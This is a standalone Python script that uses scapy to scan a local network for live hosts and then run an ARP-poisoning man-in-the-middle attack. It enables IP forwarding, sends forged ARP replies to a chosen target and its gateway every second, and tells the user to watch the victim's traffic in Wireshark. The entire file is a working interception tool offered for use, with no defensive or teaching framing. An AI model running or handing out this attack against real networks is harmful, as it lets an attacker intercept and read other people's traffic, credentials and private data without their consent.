import os
import sys
import getopt
import threading
import scapy.all as scapy
import ipaddress
from time import sleep

# <-- Termcolor -->
RED = "\033[0;31m"
YLW = "\033[1;33m"
GRN = "\033[0;32m"
WHITE = "\033[0m"

PACKET = 0
PORT_FORWARD_PATH = '/proc/sys/net/ipv4/ip_forward'  # for Linux

def log(message, level="INFO"):
    colors = {"INFO": GRN, "WARN": YLW, "ERROR": RED}
    print(f"{colors.get(level, WHITE)}[{level}] {message}{WHITE}")

def ifsudo():
    if os.geteuid() != 0:
        log("Run the script with sudo permissions!", "ERROR")
        sys.exit(1)

def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        log(f"Invalid IP Address: {ip}", "ERROR")
        return False

def validate_network(network):
    try:
        ipaddress.ip_network(network, strict=False)
        return True
    except ValueError:
        log(f"Invalid Network Range: {network}", "ERROR")
        return False

def scanlivehosts(network_range):
    if not validate_network(network_range):
        return
    log("Scanning live hosts...", "INFO")
    request = scapy.ARP(pdst=network_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    request_broadcast = broadcast / request
    clients = scapy.srp(request_broadcast, timeout=5, verbose=False)[0]
    results = []
    for info in clients:
        host_info = f"Host {RED}{info[1].psrc}{WHITE} is up --> MAC: {RED}{info[1].hwsrc}{WHITE}"
        log(host_info)
        results.append((info[1].psrc, info[1].hwsrc))
    save_scan_results(results)
    return results

def save_scan_results(results):
    filename = "scan_results.txt"
    with open(filename, "w") as f:
        for ip, mac in results:
            f.write(f"{ip} - {mac}\n")
    log(f"Scan results saved to {filename}", "INFO")

def set_port_forwarding(status):
    current_status = open(PORT_FORWARD_PATH).read().strip()
    if current_status == str(status):
        log(f"Port forwarding is already {'enabled' if status else 'disabled'}", "WARN")
        return
    os.system(f"echo {status} > {PORT_FORWARD_PATH}")
    log(f"Port forwarding {'enabled' if status else 'disabled'}", "INFO")

def get_mac(target):
    arp_request = scapy.ARP(pdst=target)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    response = scapy.srp(broadcast / arp_request, timeout=5, verbose=False)[0]
    return response[0][1].hwsrc if response else None

def arpspoofing(target, gateway):
    target_mac = get_mac(target)
    if not target_mac:
        log(f"Failed to get MAC address for {target}", "ERROR")
        return
    packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway)
    scapy.send(packet, verbose=False)

def arppoisoning(target, gateway):
    global PACKET
    try:
        while True:
            arpspoofing(target, gateway)
            arpspoofing(gateway, target)
            PACKET += 2
            log(f"ARP Packets Sent: {PACKET}", "INFO")
            sleep(1)
    except KeyboardInterrupt:
        log("Stopping ARP poisoning...", "WARN")

def main():
    if len(sys.argv) < 2:
        log("Insufficient arguments provided!", "ERROR")
        sys.exit(1)

    ifsudo()

    try:
        opts, _ = getopt.getopt(sys.argv[1:], "i:t:g:s:", ["interface=", "target=", "gateway=", "scan="])
        interface, target, gateway, scan_range = None, None, None, None
        for opt, arg in opts:
            if opt in ("-i", "--interface"):
                interface = arg
            elif opt in ("-t", "--target"):
                target = arg
            elif opt in ("-g", "--gateway"):
                gateway = arg
            elif opt in ("-s", "--scan"):
                scan_range = arg

        if scan_range:
            scanlivehosts(scan_range)
            sys.exit(0)

        if not (interface and target and gateway):
            log("Missing required arguments for ARP poisoning!", "ERROR")
            sys.exit(1)

        if not (validate_ip(target) and validate_ip(gateway)):
            sys.exit(1)

        set_port_forwarding(1)
        log(f"Target: {target}, Gateway: {gateway}, Interface: {interface}", "INFO")
        log(f"Open Wireshark and use filter 'ip.addr=={target}'", "INFO")

        poison_thread = threading.Thread(target=arppoisoning, args=(target, gateway), daemon=True)
        poison_thread.start()
        poison_thread.join()

    except getopt.GetoptError as e:
        log(f"Argument parsing error: {e}", "ERROR")
    except Exception as e:
        log(f"An unexpected error occurred: {e}", "ERROR")
    finally:
        set_port_forwarding(0)

if __name__ == "__main__":
    main()



